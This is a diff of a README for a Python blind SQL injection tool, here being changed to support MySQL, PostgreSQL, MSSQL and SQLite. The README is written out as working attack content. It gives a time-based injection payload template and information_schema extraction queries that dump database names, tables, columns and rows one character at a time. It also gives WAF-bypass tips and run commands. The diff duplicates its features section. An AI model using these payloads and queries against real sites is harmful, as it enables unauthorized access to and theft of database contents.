@@ -1,8 +1,8 @@
-# 🎯 Customizable Blind SQL Injection Dumper
+# 🎯 Multi-Database Blind SQL Injection Dumper
 
-A lightweight, high-performance, and fully customizable Python tool designed to automate data extraction via **Boolean-based** and **Time-based Blind SQL Injection**.
+A lightweight, high-performance, and fully dynamic Python tool designed to automate data extraction via **Boolean-based** and **Time-based Blind SQL Injection**.
 
-Unlike standard automated tools, this script allows full control over request headers (JWT, Cookies, Custom Proxies), HTTP methods, and injection payloads through a single `config.json` file—without editing a single line of Python code.
+Unlike standard automated tools, this script handles multiple Database Management Systems (DBMS) seamlessly by dynamically loading SQL syntax, payload functions, and extraction queries directly from external JSON configuration files—without editing a single line of Python code.
 
 ---
 
@@ -10,23 +10,34 @@ Unlike standard automated tools, this script allows full control over request he
 
 | Metric / Parameter | Value / Specification |
 | :--- | :--- |
-| **01. Extraction Speed** | ~1 to 3 characters/second (Time-based dependent on delay) |
-| **02. Max String Length** | Up to **50 characters** per query (Configurable) |
-| **03. Max Table Limits** | Up to **15 tables** enumerated per loop |
-| **04. Max Column Limits** | Up to **15 columns** enumerated per table |
-| **05. Max Row Dumping** | **20 rows** extracted per session |
-| **06. Default Time Threshold** | **3.0 seconds** delay detection |
-| **07. Supported Protocols** | HTTP / HTTPS (with SSL bypass) |
+| **01. Supported DBMS** | MySQL, PostgreSQL, MSSQL, SQLite |
+| **02. Extraction Speed** | ~1 to 3 characters/second (Time-based dependent on delay) |
+| **03. Max String Length** | Up to **50 characters** per query (Configurable) |
+| **04. Max Table Limits** | Up to **15 tables** enumerated per loop |
+| **05. Max Column Limits** | Up to **15 columns** enumerated per table |
+| **06. Max Row Dumping** | **20 rows** extracted per session |
+| **07. Default Time Threshold** | **3.0 seconds** delay detection |
+| **08. Supported Protocols** | HTTP / HTTPS (with SSL bypass) |
 
 ---
 
 ## ✨ Key Features
 
-1. **Zero Code Modification:** Change target URLs, HTTP headers, and payloads via `config.json`.
-2. **Dual Injection Support:** Handles both **Time-based** (`sleep`/`benchmark`) and **Boolean-based** SQLi.
-3. **Interactive CLI:** Step-by-step interactive menus to enumerate databases, tables, and columns.
-4. **Cross-Database Compatible:** Easily adapt payloads for MySQL, PostgreSQL, MSSQL, or Oracle.
-5. **WAF Bypass Friendly:** Fine-tune time thresholds (e.g., `1.5s` to `5.0s`) and headers to bypass Security Filters.
+1. **Multi-Database Architecture:** Load custom query logic for MySQL, PostgreSQL, MSSQL, or SQLite without touching the Python code.
+2. **Zero Code Modification:** Fully configurable target URLs, HTTP headers, payloads, and queries via JSON files.
+3. **Dual Injection Support:** Handles both **Time-based** (`sleep`/`pg_sleep`/`WAITFOR DELAY`) and **Boolean-based** SQLi.
+4. **Interactive CLI:** Step-by-step interactive menus to enumerate databases, tables, columns, and dump rows.
+5. **WAF Bypass Friendly:** Fine-tune time thresholds (e.g., `1.5s` to `5.0s`) and custom request headers.
+
+---
+
+## ✨ Key Features
+
+1. **Multi-Database Architecture:** Load custom query logic for MySQL, PostgreSQL, MSSQL, or SQLite without touching the Python code.
+2. **Zero Code Modification:** Fully configurable target URLs, HTTP headers, payloads, and queries via JSON files.
+3. **Dual Injection Support:** Handles both **Time-based** (`sleep`/`pg_sleep`/`WAITFOR DELAY`) and **Boolean-based** SQLi.
+4. **Interactive CLI:** Step-by-step interactive menus to enumerate databases, tables, columns, and dump rows.
+5. **WAF Bypass Friendly:** Fine-tune time thresholds (e.g., `1.5s` to `5.0s`) and custom request headers.
 
 ---
 
@@ -45,8 +56,8 @@ cd BlindSQLi-Dumper
 pip install -r requirements.txt
 ```
 ## 🚀 How to Use (Step-by-Step Guide)
-Step 1: Configure config.json
-Open config.json and adjust the target parameters, custom headers, and your specific payload:
+Choose the JSON configuration file corresponding to your target database dialect (config_mysql.json, config_postgres.json, config_mssql.json, or config_sqlite.json).
+Example config_mysql.json structure:
 ```JSON
 {
   "target_url": "[http://example.com/api/v1/search](http://example.com/api/v1/search)",
@@ -56,6 +67,12 @@ Open config.json and adjust the target parameters, custom headers, and your spec
   "time_threshold": 3.0,
   "success_keyword": "Welcome",
   "payload_template": "admin' AND IF(({query}), sleep(3), 0)-- -",
+  "queries": {
+    "get_db": "ascii(substring((SELECT database()), {pos}, 1)) = {ascii_val}",
+    "get_tables": "ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {offset},1), {pos}, 1)) = {ascii_val}",
+    "get_columns": "ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {offset},1), {pos}, 1)) = {ascii_val}",
+    "dump_data": "ascii(substring((SELECT {column} FROM {table} LIMIT {offset},1), {pos}, 1)) = {ascii_val}"
+  },
   "headers": {
     "User-Agent": "Mozilla/5.0",
     "Content-Type": "application/json",
@@ -66,8 +83,25 @@ Open config.json and adjust the target parameters, custom headers, and your spec
 ## Step 2: Run the Script
 Execute the main script using Python:
 ```bash
-python dumper.py -c config.json
+python dumper.py -c config_mysql.json
 ```
+For MySQL / MariaDB:
+```Bash
+python dumper.py -c config_mysql.json
+```
+For PostgreSQL:
+```Bash
+python dumper.py -c config_postgres.json
+```
+For Microsoft SQL Server (MSSQL):
+```Bash
+python dumper.py -c config_mssql.json
+```
+For SQLite:
+```Bash
+python dumper.py -c config_sqlite.json
+```
+
 ## 📋 Interactive Workflow (4 Stages)
 When you run the tool, it guides you interactively through the extraction process across 4 distinct stages:
 
